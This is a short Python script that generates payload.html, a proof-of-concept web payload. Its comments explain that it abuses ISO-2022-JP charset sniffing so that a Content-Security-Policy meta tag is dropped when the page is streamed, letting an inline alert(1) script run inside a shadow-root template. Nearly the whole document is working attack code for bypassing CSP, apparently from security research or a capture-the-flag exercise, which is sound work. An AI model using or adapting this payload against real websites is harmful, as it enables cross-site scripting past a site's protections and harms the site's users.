import random
import string
chars = string.digits + string.ascii_uppercase + string.ascii_lowercase

def next():
    return ''.join([random.choice(chars) for _ in range(40000)]).encode()

# we want to create a parsing differential when the HTML is loaded incrementally (streamed) vs loaded inline (all at once)
# The <meta> CSP tag should be present in the parsed HTML when it's loaded inline, but NOT present when this HTML is loaded incrementally
# we can take advantage of the fact that the sniffer will not change the encoding of an already parsed HTML chunk
# we can use ISO-2022-JP charset
html = b'<html><head>'
html += b'<!-- '+next()+b' -->'
html += b'</z \x1b$@ z="zzz \x1b(B > <meta http-equiv="Content-Security-Policy" content="default-src \'none\'">'
html += b'<!-- '+next()+b' -->'
html += b'<meta http-equiv="Content-Type" content="text/html; charset=ISO-2022-JP">'
html += b'</head><body><template shadowrootmode="closed"><script>alert(1)</script></body>'

with open('payload.html', 'wb') as f:
    f.write(html)
